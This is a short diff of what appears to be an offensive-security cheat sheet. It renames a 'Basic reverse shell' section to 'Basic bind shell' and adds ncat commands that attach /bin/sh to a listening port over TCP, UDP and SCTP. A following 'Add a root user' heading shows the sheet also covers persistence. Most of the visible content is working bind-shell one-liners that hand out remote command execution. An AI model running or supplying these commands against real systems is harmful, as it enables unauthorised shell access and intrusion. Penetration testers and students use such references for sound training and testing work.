@@ -18,12 +18,12 @@
 * [References](#references)
 
 
-## Basic reverse shell
+## Basic bind shell
 
 ```bash
-ncat --udp -lvp 4242
-ncat --sctp -lvp 4242
-ncat --tcp -lvp 4242
+ncat -e /bin/sh -lvp 4242
+ncat -e /bin/sh --udp -lvp 4242
+ncat -e /bin/sh --sctp -lvp 4242
 ```
 
 ## Add a root user
